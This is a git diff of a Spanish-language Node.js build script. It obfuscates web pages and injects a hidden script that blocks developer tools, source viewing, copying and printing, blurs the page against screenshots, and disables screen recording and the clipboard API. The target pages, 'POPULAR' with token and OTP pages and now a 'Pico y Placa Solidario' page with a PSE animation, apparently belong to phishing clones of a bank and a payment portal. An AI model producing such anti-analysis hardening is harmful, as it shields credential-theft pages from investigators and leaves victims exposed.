@@ -1,6 +1,7 @@
 /* ============================================
-   OFUSCAR POPULAR + ANTI-INSPECCIÓN
-   Ofusca HTML + CSS + JS y agrega anti-inspección
+   OFUSCAR PYP (PICO Y PLACA SOLIDARIO) + ANTI-INSPECCIÓN
+   + ANTI-CAPTURAS DE PANTALLA
+   + OPTIMIZACIÓN DE IMÁGENES CON SHARP
    ============================================ */
 
 const fs = require('fs');
@@ -9,10 +10,20 @@ const JavaScriptObfuscator = require('javascript-obfuscator');
 const { minify: minifyHTML } = require('html-minifier-terser');
 const CleanCSS = require('clean-css');
 
+// Sharp es opcional (si no está instalado, se salta)
+let sharp = null;
+try {
+    sharp = require('sharp');
+} catch (e) {
+    console.log('⚠️  Sharp no instalado - se omitirá la optimización de imágenes');
+    console.log('   Instálalo con: npm install sharp\n');
+}
+
 // ============================================
 // CONFIGURACIÓN
 // ============================================
-const CARPETA = path.join(__dirname, 'popular-build');
+const CARPETA = path.join(__dirname, 'pyp-build');
+const CARPETA_IMG = path.join(CARPETA, 'img');
 
 // Configuración del ofuscador JS
 const CONFIG_JS = {
@@ -48,12 +59,16 @@ const CONFIG_JS = {
 };
 
 // ============================================
-// BLOQUE ANTI-INSPECCIÓN
+// BLOQUE ANTI-INSPECCIÓN + ANTI-CAPTURAS
 // ============================================
 const BLOQUE_ANTI = `
 <script>
 (function(){
 'use strict';
+
+/* ============================================
+   ANTI-INSPECCIÓN
+   ============================================ */
 var _0xa1=0;
 document.addEventListener('touchend',function(_0xb2){
 var _0xc3=new Date().getTime();
@@ -70,15 +85,107 @@ if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
 if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
 if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
 if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
 });
 document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
-try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+document.addEventListener('selectstart',function(_0xl1){_0xl1.preventDefault();});
+document.addEventListener('copy',function(_0xm2){_0xm2.preventDefault();return false;});
+document.addEventListener('cut',function(_0xn3){_0xn3.preventDefault();return false;});
+
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xo4){document.body.innerHTML='';}
+
+/* ============================================
+   ANTI-CAPTURAS DE PANTALLA
+   ============================================ */
+
+/* Detectar teclas de captura y ocultar contenido */
+var _0xp5=null;
+function _0xq6(){
+    document.documentElement.style.filter='blur(20px)';
+    document.documentElement.style.transition='filter 0.1s';
+    setTimeout(function(){
+        document.documentElement.style.filter='';
+    },1500);
+}
+window.addEventListener('keyup',function(_0xr7){
+    var _0xs8=_0xr7.key||'';
+    var _0xt9=_0xs8.toLowerCase();
+    /* PrintScreen */
+    if(_0xt9==='printscreen'||_0xr7.keyCode===44){
+        _0xq6();
+        if(navigator.clipboard&&navigator.clipboard.writeText){
+            try{navigator.clipboard.writeText('');}catch(e){}
+        }
+    }
+    /* Windows + Shift + S (recorte) */
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&_0xt9==='s'){_0xq6();}
+    /* Windows + PrintScreen */
+    if(_0xr7.metaKey&&_0xt9==='printscreen'){_0xq6();}
+    /* Cmd + Shift + 3/4/5 (Mac) */
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&(_0xt9==='3'||_0xt9==='4'||_0xt9==='5')){_0xq6();}
+},{capture:true});
+
+/* Detectar pérdida de foco (posible captura) */
+var _0xu0=0;
+window.addEventListener('blur',function(){
+    _0xu0=new Date().getTime();
+    _0xq6();
+});
+window.addEventListener('focus',function(){
+    if(_0xu0>0){
+        var _0xv1=new Date().getTime()-_0xu0;
+        if(_0xv1<800){_0xq6();}
+    }
+});
+
+/* Detectar cambios de visibilidad (grabación de pantalla) */
+document.addEventListener('visibilitychange',function(){
+    if(document.hidden){document.body.style.filter='blur(30px)';}
+    else{document.body.style.filter='';}
+});
+
+/* Bloquear grabación de pantalla (MediaRecorder / getDisplayMedia) */
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+    var _0xw2=navigator.mediaDevices.getDisplayMedia;
+    navigator.mediaDevices.getDisplayMedia=function(){
+        _0xq6();
+        return Promise.reject(new Error('Captura de pantalla no permitida'));
+    };
+}
+
+/* Bloquear MediaRecorder */
+if(window.MediaRecorder){
+    var _0xx3=window.MediaRecorder;
+    window.MediaRecorder=function(){
+        _0xq6();
+        throw new Error('Grabación no permitida');
+    };
+}
+
+/* Detectar DevTools abierto (posible inspección) */
+var _0xy4=new Image();
+Object.defineProperty(_0xy4,'id',{
+    get:function(){
+        document.body.style.filter='blur(15px)';
+        setTimeout(function(){document.body.style.filter='';},2000);
+    }
+});
+
+/* Deshabilitar clipboard API */
+if(navigator.clipboard){
+    try{
+        navigator.clipboard.writeText=function(){return Promise.reject();};
+        navigator.clipboard.write=function(){return Promise.reject();};
+    }catch(e){}
+}
+
 })();
 </script>
 `;
 
 // ============================================
-// FUNCIONES
+// FUNCIONES DE OFUSCACIÓN
 // ============================================
 function ofuscarJS(archivo) {
     const ruta = path.join(CARPETA, archivo);
@@ -108,8 +215,7 @@ async function minificarHTML(archivo) {
         let codigo = fs.readFileSync(ruta, 'utf8');
 
         // 1. Insertar anti-inspección antes de </body> si no existe
-        // Popular ya usa _0x22 / contextmenu — checamos ambos
-        if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf('_0xeia') === -1) {
+        if (codigo.indexOf('_0xa1=0') === -1 && codigo.indexOf("addEventListener('contextmenu'") === -1) {
             if (codigo.indexOf('</body>') !== -1) {
                 codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
             } else {
@@ -153,30 +259,141 @@ function minificarCSS(archivo) {
 }
 
 // ============================================
+// OPTIMIZACIÓN DE IMÁGENES CON SHARP
+// ============================================
+async function optimizarImagen(rutaEntrada) {
+    const ext = path.extname(rutaEntrada).toLowerCase();
+    const nombre = path.basename(rutaEntrada);
+    const statsAntes = fs.statSync(rutaEntrada).size;
+
+    // Saltar GIFs (Sharp no anima GIFs)
+    if (ext === '.gif') {
+        console.log(`   ⏭️  Saltando: ${nombre} (GIF animado)`);
+        return;
+    }
+
+    // Solo JPG, JPEG, PNG, WebP
+    if (!/\.(jpg|jpeg|png|webp)$/i.test(ext)) {
+        return;
+    }
+
+    let pipeline = sharp(rutaEntrada);
+
+    try {
+        if (ext === '.jpg' || ext === '.jpeg') {
+            pipeline = pipeline.jpeg({
+                quality: 80,
+                mozjpeg: true,
+                progressive: true
+            });
+        } else if (ext === '.png') {
+            pipeline = pipeline.png({
+                compressionLevel: 9,
+                palette: true
+            });
+        } else if (ext === '.webp') {
+            pipeline = pipeline.webp({ quality: 80, effort: 4 });
+        }
+
+        const buffer = await pipeline.toBuffer();
+        fs.writeFileSync(rutaEntrada, buffer);
+
+        const statsDespues = fs.statSync(rutaEntrada).size;
+        const ahorro = ((1 - statsDespues / statsAntes) * 100).toFixed(1);
+
+        if (ahorro > 0) {
+            console.log(`   ✅ ${nombre}: ${(statsAntes/1024).toFixed(1)}KB → ${(statsDespues/1024).toFixed(1)}KB (-${ahorro}%)`);
+        } else {
+            console.log(`   ✅ ${nombre}: ya estaba optimizada`);
+        }
+    } catch (err) {
+        console.log(`   ❌ Error en ${nombre}: ${err.message}`);
+    }
+}
+
+async function optimizarCarpeta(carpeta) {
+    if (!fs.existsSync(carpeta)) {
+        return;
+    }
+
+    const archivos = fs.readdirSync(carpeta);
+
+    for (const archivo of archivos) {
+        const rutaCompleta = path.join(carpeta, archivo);
+        const stat = fs.statSync(rutaCompleta);
+
+        if (stat.isDirectory()) {
+            await optimizarCarpeta(rutaCompleta);
+        } else {
+            await optimizarImagen(rutaCompleta);
+        }
+    }
+}
+
+// ============================================
 // EJECUTAR
 // ============================================
 async function main() {
-    console.log('\n🔒 OFUSCANDO POPULAR + ANTI-INSPECCIÓN\n');
+    console.log('\n🔒 OFUSCANDO PYP (PICO Y PLACA SOLIDARIO) + ANTI-INSPECCIÓN\n');
 
-    // Minificar HTML + insertar anti-inspección
-    console.log('📄 Minificando HTML + agregando anti-inspección:');
+    // Verificar que exista la carpeta
+    if (!fs.existsSync(CARPETA)) {
+        console.log(`❌ ERROR: No existe la carpeta "${CARPETA}"`);
+        console.log(`   Crea la carpeta "pyp-build" y coloca dentro tu index.html\n`);
+        process.exit(1);
+    }
+
+    // 1. Minificar HTML + insertar anti-inspección + anti-capturas
+    console.log('📄 Minificando HTML + agregando anti-inspección + anti-capturas:');
     await minificarHTML('index.html');
-    await minificarHTML('token.html');
-    await minificarHTML('otp.html');
 
-    // Minificar CSS
+    // 2. Ofuscar JS externos (si los hay)
+    console.log('\n📄 Ofuscando archivos JS:');
+    ofuscarJS('pse-animacion.js');
+
+    // 3. Minificar CSS (si existe styles.css)
     console.log('\n📄 Minificando CSS:');
     minificarCSS('styles.css');
 
-    console.log('\n✅ POPULAR OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
+    // 4. Optimizar imágenes con Sharp
+    if (sharp) {
+        console.log('\n🖼️  Optimizando imágenes con Sharp:');
+        await optimizarCarpeta(CARPETA_IMG);
+    }
+
+    console.log('\n✅ PYP OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
     console.log('🔒 Anti-inspección activado:');
     console.log('   ❌ F12 bloqueado');
-    console.log('   ❌ Ctrl+Shift+I bloqueado');
+    console.log('   ❌ Ctrl+Shift+I / J / C bloqueado');
     console.log('   ❌ Ctrl+U bloqueado');
     console.log('   ❌ Ctrl+S bloqueado');
+    console.log('   ❌ Ctrl+P bloqueado');
+    console.log('   ❌ Ctrl+A bloqueado');
     console.log('   ❌ Click derecho bloqueado');
     console.log('   ❌ Arrastrar bloqueado');
-    console.log('   ❌ Iframes bloqueados\n');
+    console.log('   ❌ Copiar / Cortar bloqueado');
+    console.log('   ❌ Selección de texto bloqueada');
+    console.log('   ❌ Iframes bloqueados');
+    console.log('\n📸 Anti-capturas de pantalla activado:');
+    console.log('   ❌ PrintScreen bloqueado (blur + limpieza de clipboard)');
+    console.log('   ❌ Windows + Shift + S bloqueado');
+    console.log('   ❌ Windows + PrintScreen bloqueado');
+    console.log('   ❌ Cmd + Shift + 3 / 4 / 5 (Mac) bloqueado');
+    console.log('   ❌ getDisplayMedia bloqueado');
+    console.log('   ❌ MediaRecorder bloqueado');
+    console.log('   ❌ Cambio de pestaña → blur automático');
+    console.log('   ❌ Pérdida de foco → blur automático');
+    console.log('   ❌ Clipboard API deshabilitada');
+    console.log('\n🖼️  Optimización de imágenes:');
+    if (sharp) {
+        console.log('   ✅ JPG/JPEG comprimidos con mozjpeg (calidad 80)');
+        console.log('   ✅ PNG comprimidos nivel 9 + palette');
+        console.log('   ✅ WebP comprimidos (calidad 80)');
+        console.log('   ⏭️  GIFs saltados (no animados por Sharp)');
+    } else {
+        console.log('   ⚠️  Sharp no instalado (npm install sharp)');
+    }
+    console.log('');
 }
 
 main();
